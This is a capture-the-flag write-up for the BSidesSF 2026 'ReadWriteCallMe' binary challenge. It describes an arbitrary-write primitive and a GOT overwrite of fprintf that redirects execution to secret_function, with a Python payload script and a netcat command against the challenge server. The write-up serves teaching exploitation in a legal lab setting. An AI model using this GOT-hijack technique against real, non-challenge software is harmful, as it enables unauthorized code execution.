# ReadWriteCallMe - BSidesSF 2026 CTF

## Challenge Info
- **Category**: PWN
- **Author**: ron
- **Flag**: `CTF{read-and-write-the-memoriesss}`

## TL;DR
Binary provides arbitrary read/write primitives. Overwrite `fprintf@GOT` with `secret_function` address. When the write loop calls fprintf for progress output, it jumps to secret_function which reads and prints the flag.

## Description
> I hear there's a secret function! Can you call it?

## Analysis

### Binary info
- ELF 64-bit, x86-64, dynamically linked, not stripped
- Partial RELRO (GOT is writable)

### Functions
- `main` (0x4011f6, 818 bytes) — menu-driven read/write interface
- `secret_function` (0x401528, 138 bytes) — reads and prints `/home/ctf/flag.txt`

### Main loop
The program provides 3 commands:
1. **`r` (read)**: `write(stdout, address, length)` — arbitrary memory read
2. **`h` (hexdump)**: `memcpy` to stack buffer then print hex — arbitrary read
3. **`w` (write)**: `fread(address, 1, length, stdin)` — **arbitrary memory write**

Input format per iteration: command char, hex address, hex length (each newline-terminated).

### secret_function
```c
void secret_function() {
    putchar('\n');
    puts("I'm not called from anywhere but I'm still very important!");
    FILE *f = fopen("/home/ctf/flag.txt", "r");
    if (f) { fgets(buf, 0x80, f); puts(buf); }
    else { puts("couldn't open flag"); }
    exit(0);
}
```

## Exploit

### Strategy: GOT overwrite
With arbitrary write and partial RELRO, we can overwrite any GOT entry to redirect function calls.

**Key consideration**: Which GOT entry to overwrite?
- `fgets@GOT` (0x404020) — **BAD**: secret_function uses fgets internally to read flag → infinite recursion
- `fprintf@GOT` (0x404030) — **GOOD**: called in write loop's progress message (`Wrote %d\n` to stderr), NOT used by secret_function

### Exploit flow
1. Send `w` command
2. Address: `0x404030` (fprintf@GOT)
3. Length: `8`
4. Data: `0x401528` packed as little-endian 64-bit (secret_function address)
5. After fread completes writing our 8 bytes, the write loop calls `fprintf(stderr, "Wrote %d\n", bytes_written)`
6. fprintf@GOT now points to secret_function → flag is printed

### Exploit code
```python
import struct, sys

cmd = b'w\n'
addr = b'404030\n'     # fprintf@GOT
length = b'8\n'        # 8 bytes (64-bit pointer)
payload = struct.pack('<Q', 0x401528)  # secret_function

sys.stdout.buffer.write(cmd + addr + length + payload)
```

```bash
python3 exploit.py | nc readwritecallme-b32595e6.challenges.bsidessf.net 4444
```

## Flag
```
CTF{read-and-write-the-memoriesss}
```

## Key Lessons
- Arbitrary write + writable GOT = trivial code execution redirection
- When hijacking GOT entries, avoid functions used by the target (secret_function used fgets → infinite recursion)
- fprintf was the perfect target: called after the write completes, not used by secret_function
- The "write" loop calls fprintf for progress reporting, creating a reliable trigger point
